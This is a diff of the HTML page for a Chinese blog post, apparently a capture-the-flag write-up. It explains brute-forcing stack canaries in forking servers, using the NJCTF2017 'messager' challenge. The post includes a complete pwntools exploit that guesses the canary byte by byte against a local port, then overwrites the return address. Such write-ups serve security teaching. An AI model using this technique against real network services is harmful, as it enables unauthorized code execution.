@@ -10,19 +10,19 @@
 <title>Bypassing Canary——Brute force - Jon Tsang&#39;Blog</title>
 
 
-    <meta name="description" content="我们都一般来说，一个链接了标准库的文件都以__libc_start_main为开始，该函数会初始化一些必要的数据结构，其中就包括了Canary，由下面这个函数产生。">
+    <meta name="description" content="我们都一般来说，一个链接了标准库的文件都以__libc_start_main为开始，该函数会初始化一些必要的数据结构，其中也包括了Canary，它由下面这个函数产生：12// glibc-2.29 -- csu/libc-start.cuintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random) 也就是说Canary的值在程序">
 <meta name="keywords" content="CTF,pwn,Canary,StackOverflow">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Bypassing Canary——Brute force">
 <meta property="og:url" content="https://jontsang.github.io/post/65468.html">
 <meta property="og:site_name" content="Jon Tsang&#39;Blog">
-<meta property="og:description" content="我们都一般来说，一个链接了标准库的文件都以__libc_start_main为开始，该函数会初始化一些必要的数据结构，其中就包括了Canary，由下面这个函数产生。">
+<meta property="og:description" content="我们都一般来说，一个链接了标准库的文件都以__libc_start_main为开始，该函数会初始化一些必要的数据结构，其中也包括了Canary，它由下面这个函数产生：12// glibc-2.29 -- csu/libc-start.cuintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random) 也就是说Canary的值在程序">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://jontsang.github.io/images/og_image.png">
-<meta property="og:updated_time" content="2019-08-24T07:44:09.908Z">
+<meta property="og:updated_time" content="2019-08-25T12:11:38.494Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Bypassing Canary——Brute force">
-<meta name="twitter:description" content="我们都一般来说，一个链接了标准库的文件都以__libc_start_main为开始，该函数会初始化一些必要的数据结构，其中就包括了Canary，由下面这个函数产生。">
+<meta name="twitter:description" content="我们都一般来说，一个链接了标准库的文件都以__libc_start_main为开始，该函数会初始化一些必要的数据结构，其中也包括了Canary，它由下面这个函数产生：12// glibc-2.29 -- csu/libc-start.cuintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random) 也就是说Canary的值在程序">
 <meta name="twitter:image" content="https://jontsang.github.io/images/og_image.png">
 
 
@@ -168,7 +168,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    6 分钟 读完 (大约 894 个字)
+                    6 分钟 读完 (大约 860 个字)
                 </span>
                 
                 
@@ -186,9 +186,9 @@
             
         </h1>
         <div class="content">
-            <p>我们都一般来说，一个链接了标准库的文件都以<code>__libc_start_main</code>为开始，该函数会初始化一些必要的数据结构，其中就包括了Canary，由下面这个函数产生。<br><a id="more"></a></p>
-<figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// glibc-2.29 -- csu/libc-start.c</span></span><br><span class="line"><span class="hljs-keyword">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random)</span><br></pre></td></tr></table></figure>
+            <p>我们都一般来说，一个链接了标准库的文件都以<code>__libc_start_main</code>为开始，该函数会初始化一些必要的数据结构，其中也包括了Canary，它由下面这个函数产生：<br><figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// glibc-2.29 -- csu/libc-start.c</span></span><br><span class="line"><span class="hljs-keyword">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random)</span><br></pre></td></tr></table></figure></p>
 <p>也就是说Canary的值在程序一开始运行时就已经确定了。而对于典型的多进程并发服务器，程序统一由父进程来accept连接，然后fork子进程处理读写。子进程数据空间中的内容是父进程的完整拷贝，二者具有相同的Canary，这也让爆破Canary成为了可能。</p>
+<a id="more"></a>
 <ul>
 <li>首先Canary第0位永远是0x00，这是为了防止Canary被打印出来做的截断。</li>
 <li>确定溢出长度后，在该长度基础上逐位增加一字节爆破，如果程序没有崩溃则说明该位正确</li>
@@ -197,8 +197,6 @@
 <p>下面来看具体的例子</p>
 <h2 id="NJCTF2017-messager"><a href="#NJCTF2017-messager" class="headerlink" title="NJCTF2017 messager"></a>NJCTF2017 messager</h2><p>checksec:</p>
 <figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span> checksec messager</span><br><span class="line">[*] '/root/NJCTF2017/messager'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
-<p>运行结果：</p>
-<p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/Snipaste_2019-08-21_10-37-37.png" alt></p>
 <h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>使用IDA分析，我们可以得到第一个关键信息</p>
 <ul>
 <li>这是一个典型的多进程并发服务器</li>
@@ -224,7 +222,7 @@
 </ol>
 <figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#!/usr/bin/python</span></span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="hljs-string">'WARN'</span></span><br><span class="line"></span><br><span class="line">send_flag = p64(<span class="hljs-number">0x400bc6</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># leak Canary</span></span><br><span class="line">canary = <span class="hljs-string">"\x00"</span>				<span class="hljs-comment">#Canary的最低位为0x00</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):</span><br><span class="line">    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">256</span>):</span><br><span class="line">        p = remote(<span class="hljs-string">"127.0.0.1"</span>, <span class="hljs-number">5555</span>)</span><br><span class="line">        p.recv()</span><br><span class="line">        p.send(<span class="hljs-string">"A"</span>*<span class="hljs-number">0x68</span>+canary+chr(y))</span><br><span class="line">        <span class="hljs-keyword">try</span>:</span><br><span class="line">            p.recv()</span><br><span class="line">        <span class="hljs-keyword">except</span>:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="hljs-keyword">continue</span></span><br><span class="line">        p.close()</span><br><span class="line">        <span class="hljs-keyword">break</span></span><br><span class="line">    canary += chr(y)</span><br><span class="line">    print(<span class="hljs-string">"[*] Canary byte "</span> + str(x+<span class="hljs-number">1</span>) +<span class="hljs-string">": "</span> + hex(y))</span><br><span class="line"></span><br><span class="line">p = remote(<span class="hljs-string">"127.0.0.1"</span>, <span class="hljs-number">5555</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="hljs-string">"A"</span>*<span class="hljs-number">0x68</span>+canary+<span class="hljs-string">"A"</span>*<span class="hljs-number">8</span>+send_flag)</span><br><span class="line">flag = p.recv()</span><br><span class="line">p.close()</span><br><span class="line">print(<span class="hljs-string">'[+] flag is:'</span> + flag)</span><br></pre></td></tr></table></figure>
 <p>Exp运行结果：</p>
-<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ./exp.py</span><br><span class="line">[*] Canary byte 1: 0x10</span><br><span class="line">[*] Canary byte 2: 0x30</span><br><span class="line">[*] Canary byte 3: 0xe4</span><br><span class="line">[*] Canary byte 4: 0x8c</span><br><span class="line">[*] Canary byte 5: 0x87</span><br><span class="line">[*] Canary byte 6: 0x2</span><br><span class="line">[*] Canary byte 7: 0x19</span><br><span class="line">[+] flag is:flag&#123;This is flag&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/Snipaste_2019-08-21_10-37-37.png" alt></p>
 
         </div>
         <!-- 文章结尾添加版权声明 从这里开始 -->
